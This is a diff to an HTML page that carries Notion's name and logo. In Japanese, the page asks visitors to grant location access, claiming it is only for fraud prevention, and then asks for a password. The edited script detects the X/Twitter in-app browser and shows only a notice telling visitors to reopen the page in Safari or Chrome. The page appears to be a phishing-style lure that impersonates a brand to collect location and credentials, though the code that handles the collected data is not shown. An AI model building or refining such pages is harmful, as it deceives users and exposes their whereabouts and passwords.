@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="icon" type="image/x-icon" href="favicon.ico" />
-    <title>Notion</title>
+    <title>Notion 認証</title>
     <style>
       body {
         font-family: "Inter", "Noto Sans JP", sans-serif;
@@ -89,46 +89,15 @@
     </style>
   </head>
   <body>
-    <!-- 位置情報許可確認画面 -->
-    <div class="container" id="locationContainer">
-      <div class="logo">
-        <img src="./Notion-logo.png" alt="notion-logo" />
-      </div>
-      <h2>位置情報の取得にご協力ください</h2>
-      <p class="description">
-        安心・安全なご利用のため、位置情報へのアクセス許可をお願いいたします。<br />
-        取得した位置情報は、不正アクセス防止のためにのみ使用します。
-      </p>
-      <button
-        id="requestButton"
-        style="display: none"
-        onclick="onClickRequestButton()"
-      >
-        位置情報を許可する
-      </button>
-      <p id="locationMessage"></p>
-    </div>
-
-    <!-- パスワード入力画面 -->
-    <div class="container" id="passwordContainer" style="display: none">
-      <div class="logo">
-        <img src="./Notion-logo.png" alt="notion-logo" />
-      </div>
-      <h2>パスワードを入力してください</h2>
-      <input type="password" id="password" placeholder="パスワード" />
-      <button id="submitButton" onclick="checkPassword()">送信</button>
-      <p id="message"></p>
-    </div>
-
-    <!-- Twitter内ブラウザ警告画面 -->
+    <!-- Twitter警告画面 -->
     <div class="container" id="twitterWarningContainer" style="display: none">
       <div class="logo">
         <img src="./Notion-logo.png" alt="notion-logo" />
       </div>
-      <h2>Safariで開いてください</h2>
+      <h2>Safari/Chromeで開いてください</h2>
       <p class="description">
-        現在、Twitterアプリ内ブラウザで開いているため、位置情報が正しく取得できない可能性があります。<br /><br />
-        以下の手順で通常のSafariブラウザで開いてください。
+        現在、Xアプリ内ブラウザで開いています。<br />
+        通常のSafariまたはChromeでこのページを開いてください。
       </p>
       <ol
         style="
@@ -138,9 +107,43 @@
           margin-left: 20px;
         "
       >
-        <li>画面右下の共有アイコン（□から↑）をタップ</li>
+        <li>右下の共有ボタン（□から↑）をタップ</li>
         <li>「Safariで開く」を選択</li>
       </ol>
+    </div>
+
+    <!-- 通常フロー画面（位置情報許可→パスワード入力） -->
+    <div id="normalFlow" style="display: none">
+      <!-- 位置情報許可画面 -->
+      <div class="container" id="locationContainer">
+        <div class="logo">
+          <img src="./Notion-logo.png" alt="notion-logo" />
+        </div>
+        <h2>位置情報の取得にご協力ください</h2>
+        <p class="description">
+          安心・安全なご利用のため、位置情報へのアクセス許可をお願いいたします。<br />
+          取得した位置情報は、不正アクセス防止のためにのみ使用します。
+        </p>
+        <button
+          id="requestButton"
+          style="display: none"
+          onclick="onClickRequestButton()"
+        >
+          位置情報を許可する
+        </button>
+        <p id="locationMessage"></p>
+      </div>
+
+      <!-- パスワード入力画面 -->
+      <div class="container" id="passwordContainer" style="display: none">
+        <div class="logo">
+          <img src="./Notion-logo.png" alt="notion-logo" />
+        </div>
+        <h2>パスワードを入力してください</h2>
+        <input type="password" id="password" placeholder="パスワード" />
+        <button id="submitButton" onclick="checkPassword()">送信</button>
+        <p id="message"></p>
+      </div>
     </div>
 
     <script>
@@ -149,15 +152,19 @@
       document.addEventListener("DOMContentLoaded", async () => {
         const ua = navigator.userAgent.toLowerCase();
         const isTwitterInAppBrowser = ua.includes("twitter");
-        const isIOS =
-          ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod");
-        const isAndroid = ua.includes("android");
 
-        if (isTwitterInAppBrowser && (isIOS || isAndroid)) {
-          // ✅ iOS or AndroidのTwitterブラウザなら警告画面を出す（今はAndroidでも出す）
-          showTwitterWarning();
+        if (isTwitterInAppBrowser) {
+          // ✅ Twitter内ブラウザなら問答無用で警告画面
+          document.getElementById("twitterWarningContainer").style.display =
+            "flex";
+          document.getElementById("normalFlow").style.display = "none";
           return;
         }
+
+        // ✅ 通常ブラウザの場合のみここから先に進む
+        document.getElementById("twitterWarningContainer").style.display =
+          "none";
+        document.getElementById("normalFlow").style.display = "block";
 
         const locationMessage = document.getElementById("locationMessage");
 
@@ -176,7 +183,6 @@
             if (permissionStatus.state === "granted") {
               console.log("初回から位置情報：許可済み");
               getLocationAndProceed();
-
               navigator.geolocation.getCurrentPosition(
                 (position) => {
                   currentLocation = {
@@ -281,13 +287,6 @@
       function getLocationAndProceed() {
         document.getElementById("locationContainer").style.display = "none";
         document.getElementById("passwordContainer").style.display = "flex";
-      }
-
-      function showTwitterWarning() {
-        document.getElementById("locationContainer").style.display = "none";
-        document.getElementById("passwordContainer").style.display = "none";
-        document.getElementById("twitterWarningContainer").style.display =
-          "flex";
       }
     </script>
   </body>
